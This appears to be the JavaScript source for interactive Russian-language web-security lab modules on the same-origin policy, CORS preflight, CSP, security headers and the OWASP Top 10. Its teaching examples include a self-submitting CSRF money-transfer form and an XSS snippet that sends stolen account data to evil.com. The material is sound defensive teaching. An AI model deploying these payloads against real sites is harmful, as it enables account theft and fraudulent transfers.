/* ===== LAB: m13 SOP matrix ===== */
function buildSopLab(){
  mkSelLab('sopLab','so',[
    {k:'fetch к чужому API',c:'#ff5370',t:'Скрипт на evil.com делает fetch к bank.com',
     d:'<b>Запрос уходит и выполняется. Ответ прочитать нельзя.</b> Браузер получил ответ, но не отдал его скрипту — в консоли будет CORS error.',
     code:'<span class="cmt">// на странице evil.com</span>\nfetch(<span class="st">"https://bank.com/api/balance"</span>, {credentials:<span class="st">"include"</span>})\n  .then(r =&gt; r.json())          <span class="cmt">← сюда управление не дойдёт</span>\n  .catch(e =&gt; ...);              <span class="cmt">← сработает это</span>',
     sec:'Ключевой нюанс: <b>запрос долетел</b>. Если бы это был не «получить баланс», а «перевести деньги», перевод бы произошёл. Вот почему SOP не защищает от CSRF.'},
    {k:'отправка формы',c:'#ffb020',t:'Форма на evil.com отправляется на bank.com',
     d:'<b>Разрешено.</b> Cross-origin writes SOP не запрещает — это базовое поведение веба с самого начала. Браузер приложит cookies жертвы.',
     code:'&lt;form action=<span class="st">"https://bank.com/transfer"</span> method=<span class="st">"POST"</span>&gt;\n  &lt;input name=<span class="st">"to"</span> value=<span class="st">"attacker"</span>&gt;\n  &lt;input name=<span class="st">"amount"</span> value=<span class="st">"10000"</span>&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
     sec:'Это и есть <b>CSRF в чистом виде</b>. Формы шлют Content-Type form-urlencoded — «простой» запрос, preflight не будет. Защита: SameSite-cookies, CSRF-токен, проверка Origin или Sec-Fetch-Site на сервере.'},
    {k:'&lt;img&gt; и &lt;script&gt;',c:'#c792ea',t:'Встраивание чужих ресурсов',
     d:'<b>Разрешено.</b> Картинку можно показать, скрипт — исполнить, стиль — применить. Но <b>содержимое прочитать из JS нельзя</b>: размеры картинки узнаешь, пиксели с canvas — нет.',
     code:'&lt;img src=<span class="st">"https://other.com/logo.png"</span>&gt;      <span class="cmt">показывается ✓</span>\n&lt;script src=<span class="st">"https://cdn.com/lib.js"</span>&gt;      <span class="cmt">исполняется ✓</span>\n\ncanvas.getContext(<span class="st">"2d"</span>).getImageData(...)   <span class="cmt">← ошибка: canvas tainted</span>',
     sec:'Внешний скрипт исполняется <b>с полными правами твоей страницы</b> — браузер не отличает его от твоего кода. Отсюда supply chain risk и необходимость SRI и CSP. Отдельно: сам факт успешной или неуспешной загрузки ресурса — канал утечки (XS-Leaks).'},
    {k:'iframe с чужим сайтом',c:'#38bdf8',t:'Доступ к DOM чужого iframe',
     d:'Встроить <b>можно</b> (если сайт не запретил через frame-ancestors), а вот залезть внутрь и прочитать DOM — <b>нельзя</b>. Общаться легально можно только через postMessage.',
     code:'<span class="kw">const</span> f = document.querySelector(<span class="st">"iframe"</span>);\nf.contentDocument.body.innerHTML;      <span class="cmt">← SecurityError</span>\n\nf.contentWindow.postMessage(msg, <span class="st">"https://app.example.com"</span>);  <span class="cmt">✓</span>',
     sec:'Раз DOM недоступен, но визуально фрейм виден — возможен <b>clickjacking</b>: прозрачный слой поверх настоящей кнопки. Лечится <code class="ic">frame-ancestors</code>. А postMessage безопасен только при проверке origin с обеих сторон.'},
    {k:'XSS внутри origin',c:'#00e676',t:'Скрипт, внедрённый в саму страницу',
     d:'<b>Разрешено абсолютно всё.</b> Скрипт исполняется в контексте bank.com, для браузера он свой. Читает DOM, cookies без HttpOnly, localStorage, шлёт запросы и <b>читает ответы</b>.',
     code:'<span class="cmt">// внедрено через уязвимость на самом bank.com</span>\nfetch(<span class="st">"/api/balance"</span>)\n  .then(r =&gt; r.json())\n  .then(d =&gt; fetch(<span class="st">"https://evil.com/log?d="</span> + btoa(JSON.stringify(d))));',
     sec:'Поэтому XSS и считают тяжёлой уязвимостью даже «всего лишь с alert». Он обесценивает разом SameSite, CSRF-токены и частично HttpOnly. Единственное, что ещё может помешать, — строгая CSP с закрытым <code class="ic">connect-src</code>.'},
    {k:'разные поддомены',c:'#ff6ac1',t:'app.example.com и api.example.com',
     d:'<b>Разные origin</b> — SOP работает между ними в полную силу. Но <b>один site</b> — значит, SameSite-cookies между ними отправляются свободно.',
     sec:'Именно поэтому XSS на второстепенном поддомене так опасен для основного приложения: cookies с <code class="ic">Domain=example.com</code> доступны, cookie tossing возможен без <code class="ic">__Host-</code>, запросы считаются same-site, а поддомен часто уже вписан в CORS-allowlist.'}
  ]);
}

/* ===== LAB: m14 preflight decision ===== */
function buildCorsLab(){
  const el=document.getElementById('corsLab');if(!el)return;
  const S={method:'GET',ctype:'form',extra:false};
  const METHODS=['GET','POST','PUT','DELETE'];
  const CTYPES=[{id:'form',k:'form-urlencoded'},{id:'multipart',k:'multipart/form-data'},{id:'text',k:'text/plain'},{id:'json',k:'application/json'}];
  function decide(){
    const reasons=[];
    if(METHODS.indexOf(S.method)>=0&&['GET','POST'].indexOf(S.method)<0)reasons.push('метод <b>'+S.method+'</b> не входит в GET / HEAD / POST');
    if(S.ctype==='json')reasons.push('<b>Content-Type: application/json</b> не входит в разрешённые три типа');
    if(S.extra)reasons.push('заголовок <b>X-Custom-Token</b> не входит в CORS-safelisted request headers');
    return reasons;
  }
  function render(){
    let h='<div style="display:flex;flex-wrap:wrap;gap:14px;margin-bottom:14px">';
    h+='<div><div style="font-size:10px;letter-spacing:1.5px;color:#4a5a6e;margin-bottom:6px">МЕТОД</div><div style="display:flex;gap:5px;flex-wrap:wrap">';
    METHODS.forEach(function(m){
      const on=S.method===m;
      h+='<button class="btn sm" style="border-color:'+(on?'#38bdf8':'rgba(56,189,248,.25)')+';color:'+(on?'#04121b':'#38bdf8')
        +';background:'+(on?'#38bdf8':'transparent')+'" onclick="window._corsM(&quot;'+m+'&quot;)">'+m+'</button>';
    });
    h+='</div></div>';
    h+='<div><div style="font-size:10px;letter-spacing:1.5px;color:#4a5a6e;margin-bottom:6px">CONTENT-TYPE</div><div style="display:flex;gap:5px;flex-wrap:wrap">';
    CTYPES.forEach(function(c){
      const on=S.ctype===c.id;
      h+='<button class="btn sm" style="border-color:'+(on?'#c792ea':'rgba(199,146,234,.25)')+';color:'+(on?'#04121b':'#c792ea')
        +';background:'+(on?'#c792ea':'transparent')+'" onclick="window._corsC(&quot;'+c.id+'&quot;)">'+c.k+'</button>';
    });
    h+='</div></div>';
    h+='<div><div style="font-size:10px;letter-spacing:1.5px;color:#4a5a6e;margin-bottom:6px">КАСТОМНЫЙ ЗАГОЛОВОК</div>';
    h+='<button class="btn sm" style="border-color:'+(S.extra?'#ffb020':'rgba(255,176,32,.25)')+';color:'+(S.extra?'#04121b':'#ffb020')
      +';background:'+(S.extra?'#ffb020':'transparent')+'" onclick="window._corsX()">'+(S.extra?'✓ ':'○ ')+'X-Custom-Token</button></div>';
    h+='</div>';

    const reasons=decide();
    const pre=reasons.length>0;
    const ct=S.ctype==='json'?'application/json':(S.ctype==='multipart'?'multipart/form-data':(S.ctype==='text'?'text/plain':'application/x-www-form-urlencoded'));
    let req='<span class="fn">'+S.method+'</span> /api/data HTTP/1.1\nHost: api.example.com\n<span class="op">Origin: https://app.example.com</span>\nContent-Type: '+ct;
    if(S.extra)req+='\n<span class="op">X-Custom-Token: abc123</span>';

    h+='<div style="border:1px solid '+(pre?'rgba(255,176,32,.4)':'rgba(0,230,118,.4)')+';border-radius:9px;padding:13px 15px;background:#0c111a;margin-bottom:12px">'
      +'<div style="font-size:13px;font-weight:600;color:'+(pre?'#ffb020':'#00e676')+';margin-bottom:7px">'
      +(pre?'▶ БУДЕТ PREFLIGHT (OPTIONS перед основным запросом)':'▶ SIMPLE REQUEST — preflight не нужен')+'</div>';
    if(pre){
      h+='<div style="font-size:12px;color:#7d8ea3;line-height:1.7">Причины:<br>';
      reasons.forEach(function(r){h+='· '+r+'<br>';});
      h+='</div>';
    }else{
      h+='<div style="font-size:12px;color:#7d8ea3;line-height:1.7">Метод из GET / HEAD / POST, разрешённый Content-Type, только safelisted-заголовки. '
        +'Такой запрос можно было отправить HTML-формой ещё до появления CORS — поэтому разрешения не спрашивают.</div>';
    }
    h+='</div>';

    if(pre){
      h+='<div class="code" style="margin:0 0 10px"><span class="code-label">1 · preflight</span>'
        +'<span class="fn">OPTIONS</span> /api/data HTTP/1.1\nHost: api.example.com\n<span class="op">Origin: https://app.example.com</span>\n'
        +'<span class="op">Access-Control-Request-Method: '+S.method+'</span>'
        +(S.extra?'\n<span class="op">Access-Control-Request-Headers: x-custom-token</span>':'')
        +'</div>';
      h+='<div class="code" style="margin:0 0 10px"><span class="code-label">2 · основной запрос (если разрешили)</span>'+req+'</div>';
    }else{
      h+='<div class="code" style="margin:0 0 10px"><span class="code-label">запрос уходит сразу</span>'+req+'</div>';
    }

    h+='<div style="padding:10px 12px;background:rgba(255,83,112,.07);border-left:2px solid #ff5370;border-radius:0 6px 6px 0;font-size:11.5px;color:#7d8ea3;line-height:1.7">'
      +'<span style="color:#ff5370">SEC ▸ </span>'
      +(pre
        ?'Preflight — не защита от CSRF, а следствие того, что такой запрос браузер раньше делать не умел. Атакующий просто использует «простой» вариант: форму с form-urlencoded.'
        :'Именно такие запросы и используются в CSRF: preflight не выполняется, cookies прикладываются автоматически. Ограничение Content-Type тремя типами — историческое: ровно это умела HTML-форма.')
      +'</div>';
    el.innerHTML=h;
  }
  window._corsM=function(m){if(METHODS.indexOf(m)<0)return;S.method=m;render();};
  window._corsC=function(c){if(!CTYPES.some(function(x){return x.id===c;}))return;S.ctype=c;render();};
  window._corsX=function(){S.extra=!S.extra;render();};
  render();
}

/* ===== LAB: m15 CSP builder ===== */
function buildCspLab(){
  mkToggleLab('cspLab','cs',[
    {id:'self',k:"default-src 'self'",c:'#38bdf8',on:true},
    {id:'inline',k:"'unsafe-inline'",c:'#ff5370',on:true},
    {id:'nonce',k:"'nonce-{RANDOM}'",c:'#00e676',on:false},
    {id:'dyn',k:"'strict-dynamic'",c:'#c792ea',on:false},
    {id:'obj',k:"object-src 'none'",c:'#ffb020',on:false},
    {id:'base',k:"base-uri 'none'",c:'#ffb020',on:false},
    {id:'fa',k:"frame-ancestors 'none'",c:'#5c9eff',on:false},
    {id:'conn',k:"connect-src 'self'",c:'#ff6ac1',on:false}
  ],function(st){
    let dirs=[];
    if(st.self)dirs.push("default-src 'self'");
    let script=[];
    if(st.nonce)script.push("'nonce-{RANDOM}'");
    if(st.dyn)script.push("'strict-dynamic'");
    if(st.self&&!st.dyn)script.push("'self'");
    if(st.inline)script.push("'unsafe-inline'");
    if(script.length)dirs.push('script-src '+script.join(' '));
    if(st.conn)dirs.push("connect-src 'self'");
    if(st.obj)dirs.push("object-src 'none'");
    if(st.base)dirs.push("base-uri 'none'");
    if(st.fa)dirs.push("frame-ancestors 'none'");
    const policy=dirs.length?dirs.join(';\n  '):'(политика пуста — CSP не задан)';

    const checks=[];
    const inlineBlocked=st.nonce||!st.inline;
    checks.push(['Inline-скрипты и обработчики onerror/onclick',
      inlineBlocked?1:0,
      inlineBlocked
        ?(st.nonce?'Есть nonce — браузер игнорирует unsafe-inline и пропускает только скрипты с верной меткой.':'unsafe-inline не задан — inline-код блокируется.')
        :'<b>unsafe-inline разрешает ровно то, чем эксплуатируется XSS.</b> Политика от XSS не защищает.']);
    checks.push(['Загрузка скрипта с чужого домена',
      (st.self||st.nonce||st.dyn)?1:0,
      (st.dyn?'strict-dynamic: доверие передаётся по цепочке от скрипта с валидным nonce, список доменов игнорируется.':(st.self||st.nonce)?'Разрешены только свои источники или помеченные nonce.':'Источники не ограничены.')]);
    checks.push(['Обход через <code class="ic">&lt;object data="javascript:..."&gt;</code>',
      st.obj?1:0,
      st.obj?"object-src 'none' закрывает этот вектор.":'<b>Не закрыто.</b> Устаревшие типы встраивания дают исполнение в обход script-src — поэтому object-src ставят в none почти всегда.']);
    checks.push(['Обход через инъекцию <code class="ic">&lt;base href&gt;</code>',
      st.base?1:0,
      st.base?"base-uri 'none' не даёт переписать базовый адрес.":'<b>Не закрыто.</b> Внедрённый тег base меняет базу для относительных ссылок — и скрипты начинают грузиться с домена атакующего, формально не нарушая script-src.']);
    checks.push(['Clickjacking (встраивание в чужой iframe)',
      st.fa?1:0,
      st.fa?"frame-ancestors 'none' запрещает встраивание. Это современная замена X-Frame-Options.":'Не закрыто. Нужен frame-ancestors или хотя бы X-Frame-Options.']);
    checks.push(['Эксфильтрация данных при сработавшем XSS',
      st.conn?1:0,
      st.conn?"connect-src 'self' не даёт отправить украденное на чужой домен через fetch или WebSocket. Каналы через img и навигацию остаются.":'Не ограничено: fetch на любой домен разрешён, украденные данные уйдут беспрепятственно.']);

    let h='<div class="code" style="margin:0 0 14px"><span class="code-label">Content-Security-Policy</span>'+policy+'</div>';
    const score=checks.filter(function(c){return c[1];}).length;
    const col=score>=5?'#00e676':(score>=3?'#ffb020':'#ff5370');
    h+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;flex-wrap:wrap">'
      +'<span style="font-size:11px;letter-spacing:1.5px;color:#4a5a6e">ОЦЕНКА ПОЛИТИКИ</span>'
      +'<span style="font-size:16px;font-weight:700;color:'+col+'">'+score+' / '+checks.length+'</span>'
      +'<span style="font-size:11px;color:#7d8ea3">'+(score>=5?'сильная политика':(score>=3?'частичная защита':'политика почти не защищает'))+'</span></div>';
    h+='<div style="display:flex;flex-direction:column;gap:6px">';
    checks.forEach(function(c){
      const ok=c[1],cc=ok?'#00e676':'#ff5370';
      h+='<div style="border:1px solid rgba(56,189,248,.14);border-left:3px solid '+cc+';border-radius:0 7px 7px 0;padding:9px 12px;background:#0c111a">'
        +'<div style="display:flex;gap:10px;align-items:baseline;flex-wrap:wrap">'
        +'<span style="font-size:12.5px;color:#cdd9e5">'+c[0]+'</span>'
        +'<span style="margin-left:auto;font-size:10px;letter-spacing:1px;color:'+cc+'">'+(ok?'закрыто':'ОТКРЫТО')+'</span></div>'
        +'<div style="font-size:11.5px;color:#7d8ea3;line-height:1.6;margin-top:4px">'+c[2]+'</div></div>';
    });
    h+='</div>';
    h+='<div style="margin-top:12px;padding:10px 12px;background:rgba(199,146,234,.07);border-left:2px solid #c792ea;border-radius:0 6px 6px 0;font-size:11.5px;color:#7d8ea3;line-height:1.7">'
      +'<span style="color:#c792ea">ЦЕЛЬ ▸ </span>включи <b>nonce + strict-dynamic + object-src none + base-uri none</b> и выключи unsafe-inline — получишь рекомендованную strict CSP. '
      +'Хвост вида <code class="ic">https: &#39;unsafe-inline&#39;</code> в реальных политиках оставляют осознанно: современный браузер их проигнорирует при наличии nonce и strict-dynamic, а старый откатится на рабочий вариант.</div>';
    return h;
  });
}

/* ===== LAB: m16 headers ===== */
function buildHeadersLab(){
  mkSelLab('headersLab','hd',[
    {k:'HSTS',c:'#00e676',t:'Strict-Transport-Security',
     d:'Заставляет браузер ходить на домен только по HTTPS в течение указанного времени.',
     code:'<span class="fn">Strict-Transport-Security</span>: max-age=31536000; includeSubDomains; preload',
     sec:'<b>Без него:</b> первый запрос летит по HTTP и его можно перехватить, не дав редиректу дойти (SSL stripping). <b>Осторожно:</b> includeSubDomains сломает поддомены без HTTPS, а выход из preload-списка занимает месяцы.'},
    {k:'nosniff',c:'#38bdf8',t:'X-Content-Type-Options',
     d:'Единственное значение — <code class="ic">nosniff</code>. Запрещает браузеру угадывать тип файла по содержимому.',
     code:'<span class="fn">X-Content-Type-Options</span>: nosniff',
     sec:'<b>Без него:</b> загруженный пользователем «файл-картинка» с HTML внутри может быть разобран как страница — stored XSS. Также блокирует загрузку скриптов и стилей с неподходящим MIME-типом.'},
    {k:'frame-ancestors',c:'#5c9eff',t:'Защита от clickjacking',
     d:'Кто может встроить страницу в iframe. Современный вариант — директива CSP, устаревший — отдельный заголовок.',
     code:'<span class="fn">Content-Security-Policy</span>: frame-ancestors &#39;none&#39;\n<span class="fn">X-Frame-Options</span>: DENY          <span class="cmt">← для старых браузеров</span>',
     sec:'<b>Без них:</b> прозрачный iframe с твоим сайтом поверх приманки — жертва кликает по «выиграть приз», а клик уходит в «подтвердить перевод». <b>При наличии обоих побеждает CSP.</b> И помни: X-Frame-Options в теге meta не работает вообще, а значение ALLOW-FROM устарело.'},
    {k:'Referrer-Policy',c:'#ffb020',t:'Контроль утечки через Referer',
     d:'Сколько информации об исходной странице уходит при переходе. Дефолт современных браузеров — <code class="ic">strict-origin-when-cross-origin</code>.',
     code:'<span class="fn">Referrer-Policy</span>: strict-origin-when-cross-origin\n<span class="cmt">своим — полный URL, чужим — только origin, по HTTP — ничего</span>',
     sec:'<b>Без него:</b> полный URL уходит третьей стороне. А в URL часто лежат токены сброса пароля, идентификаторы приглашений, приватные пути. Классическая утечка: пользователь на странице <code class="ic">/reset?token=...</code> кликает внешнюю ссылку — токен ушёл.'},
    {k:'Permissions-Policy',c:'#c792ea',t:'Ограничение мощных API',
     d:'Разрешает или запрещает камеру, микрофон, геолокацию, платежи — для страницы и для вложенных фреймов.',
     code:'<span class="fn">Permissions-Policy</span>: camera=(), microphone=(), geolocation=(), payment=()',
     sec:'<b>Зачем:</b> ограничивает не только твой код, но и сторонние виджеты во фреймах. Если рекламный iframe попросит геолокацию, браузер откажет ещё до диалога с пользователем.'},
    {k:'COOP / COEP / CORP',c:'#ff6ac1',t:'Cross-origin изоляция',
     d:'Троица, появившаяся после Spectre. Задача — не дать чужим документам оказаться в одном процессе и в одной памяти с твоим.',
     code:'<span class="fn">Cross-Origin-Opener-Policy</span>: same-origin\n<span class="fn">Cross-Origin-Embedder-Policy</span>: require-corp\n<span class="fn">Cross-Origin-Resource-Policy</span>: same-origin',
     sec:'COOP разрывает связь через <code class="ic">window.opener</code> — закрывает часть XS-Leaks и tabnabbing. CORP не даёт телу ответа попасть в чужой процесс. COOP + COEP включают cross-origin isolation, без которой недоступны SharedArrayBuffer и точные таймеры.'},
    {k:'Fetch Metadata',c:'#00e676',t:'Sec-Fetch-* — контекст запроса',
     d:'Браузер сам добавляет к каждому запросу описание контекста: откуда, каким способом, для чего. Подделать из JS нельзя.',
     code:'<span class="fn">Sec-Fetch-Site</span>: cross-site\n<span class="fn">Sec-Fetch-Mode</span>: no-cors\n<span class="fn">Sec-Fetch-Dest</span>: image\n<span class="fn">Sec-Fetch-User</span>: ?1\n\n<span class="cmt"># серверное правило (Resource Isolation Policy)</span>\n<span class="kw">if</span> site == <span class="st">"cross-site"</span> <span class="kw">and</span> mode != <span class="st">"navigate"</span>: <span class="kw">reject</span>',
     sec:'Одной проверкой отсекается CSRF, часть XS-Leaks и попытки загрузить твои эндпоинты как скрипт или картинку. Надёжнее <code class="ic">Referer</code>, который может отсутствовать, и <code class="ic">Origin</code>, который есть не во всех запросах.'},
    {k:'SRI',c:'#38bdf8',t:'Subresource Integrity',
     d:'Хеш ожидаемого содержимого стороннего файла. Не совпал — браузер не исполняет.',
     code:'&lt;script src=<span class="st">"https://cdn.example.com/lib.js"</span>\n        <span class="op">integrity</span>=<span class="st">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9G"</span>\n        <span class="op">crossorigin</span>=<span class="st">"anonymous"</span>&gt;&lt;/script&gt;',
     sec:'Защита от компрометации CDN — то есть от A03:2025 Software Supply Chain Failures. <b>Ограничение:</b> работает только для неизменяемых версионированных файлов. Для скриптов, которые обновляет сам поставщик, неприменим — там остаются CSP и сокращение числа сторонних скриптов.'},
    {k:'X-XSS-Protection',c:'#ff5370',t:'Устаревший заголовок',
     d:'Старый встроенный фильтр отражённого XSS в IE и раннем Chrome. <b>Признан вредным и удалён из браузеров.</b>',
     code:'<span class="fn">X-XSS-Protection</span>: 0      <span class="cmt">← либо так, либо не ставить вовсе</span>',
     sec:'Сам фильтр мог <b>создавать уязвимости</b> на безопасных сайтах, выборочно вырезая куски разметки. Если в чек-листе видишь рекомендацию «поставьте 1; mode=block» — чек-лист устарел. На собеседовании это хороший повод показать, что следишь за актуальностью.'}
  ]);
}

/* ===== LAB: m17 OWASP map ===== */
function buildOwaspLab(){
  mkSelLab('owaspLab','ow',[
    {k:'A01',c:'#ff5370',t:'A01:2025 — Broken Access Control',
     d:'Пользователь может делать то, на что у него нет прав. Сюда входят IDOR и BOLA, вертикальная эскалация, path traversal, обход через прямой вызов API. <b>В редакции 2025 сюда же переехал SSRF</b>, который раньше был отдельной категорией.',
     sec:'Связь с курсом: модули 09, 10, 12. Проверять авторизацию на сервере, на каждый объект и на каждую функцию — не в интерфейсе. Отказ по умолчанию, разрешение по списку.'},
    {k:'A02',c:'#ffb020',t:'A02:2025 — Security Misconfiguration',
     d:'Дефолтные учётки, открытые админки, отладочные режимы в проде, лишние порты, избыточные права в облаке, отсутствие security headers.',
     sec:'Связь с курсом: модули 14, 15, 16. Поднялась с пятого места — во многом за счёт облачных конфигураций и открытых наружу сервисов.'},
    {k:'A03',c:'#c792ea',t:'A03:2025 — Software Supply Chain Failures',
     d:'Расширение прежней категории про уязвимые компоненты. Теперь охватывает и компрометацию самой цепочки: реестры пакетов, зависимости, CI/CD, артефакты сборки.',
     sec:'Связь с курсом: модули 01, 07, 16. Сторонний скрипт исполняется с полными правами страницы. Меры: SRI, CSP, SCA-сканеры, фиксация версий, проверка целостности артефактов.'},
    {k:'A04',c:'#38bdf8',t:'A04:2025 — Cryptographic Failures',
     d:'Данные передаются или хранятся без должной защиты: отсутствие TLS, слабые алгоритмы, быстрые хеши для паролей, самодельная криптография, секреты в коде.',
     sec:'Связь с курсом: модули 03, 12. Argon2id для паролей, TLS 1.2 и выше, никакой самописной криптографии, секреты в менеджере секретов.'},
    {k:'A05',c:'#00e676',t:'A05:2025 — Injection',
     d:'Данные попадают в интерпретатор и трактуются как код: SQL, NoSQL, команды ОС, LDAP, шаблонизаторы. <b>XSS относится сюда же.</b>',
     sec:'Связь с курсом: модуль 07. Опустилась с третьего места не потому, что инъекций стало меньше, а потому что современные фреймворки закрывают их по умолчанию. Принцип защиты один: отделить код от данных.'},
    {k:'A06',c:'#5c9eff',t:'A06:2025 — Insecure Design',
     d:'Проблема не в реализации, а в замысле: отсутствие ограничения попыток, восстановление пароля по секретному вопросу, доверие к клиентским расчётам, отсутствие лимитов на бизнес-операции.',
     sec:'Связь с курсом: модуль 09. Патчем не чинится — нужен threat modeling на этапе проектирования. Именно этим и занимается AppSec, а не только поиском багов.'},
    {k:'A07',c:'#ff6ac1',t:'A07:2025 — Authentication Failures',
     d:'Слабые пароли, отсутствие MFA, предсказуемые идентификаторы сессий, session fixation, отсутствие ограничения попыток входа, небезопасное восстановление доступа.',
     sec:'Связь с курсом: модули 11, 12. Ротация ID после логина, короткие TTL, устойчивая к фишингу MFA, безопасный сброс пароля.'},
    {k:'A08',c:'#c792ea',t:'A08:2025 — Software or Data Integrity Failures',
     d:'Доверие данным и коду без проверки целостности: небезопасная десериализация, автообновления без подписи, зависимости из недоверенных источников.',
     sec:'Связь с курсом: модули 10, 16. Проверка подписей, SRI, никогда не десериализовать недоверенные данные в объекты.'},
    {k:'A09',c:'#38bdf8',t:'A09:2025 — Security Logging & Alerting Failures',
     d:'Атаку не видно и на неё никто не реагирует. Нет логов важных событий, нет алертов, нет корреляции, логи без защиты от подделки.',
     sec:'Акцент редакции 2025 сместился с «мониторинга» на <b>алертинг</b>: собирать логи мало, нужна реакция. Отдельный риск в обратную сторону — <b>логирование секретов и персональных данных</b>.'},
    {k:'A10',c:'#00e676',t:'A10:2025 — Mishandling of Exceptional Conditions',
     d:'<b>Новая категория.</b> Неверная обработка ошибок и краевых состояний: падение в открытое состояние (fail-open) вместо закрытого, утечка стектрейсов, необработанные исключения в проверках безопасности, некорректное поведение при таймауте.',
     sec:'Связь с курсом: модуль 05 (статус-коды и утечки в ошибках). Правило: при любой ошибке в проверке доступа отвечаем отказом, а не пропускаем. Наружу — общее сообщение, детали — только в лог.'}
  ]);
}
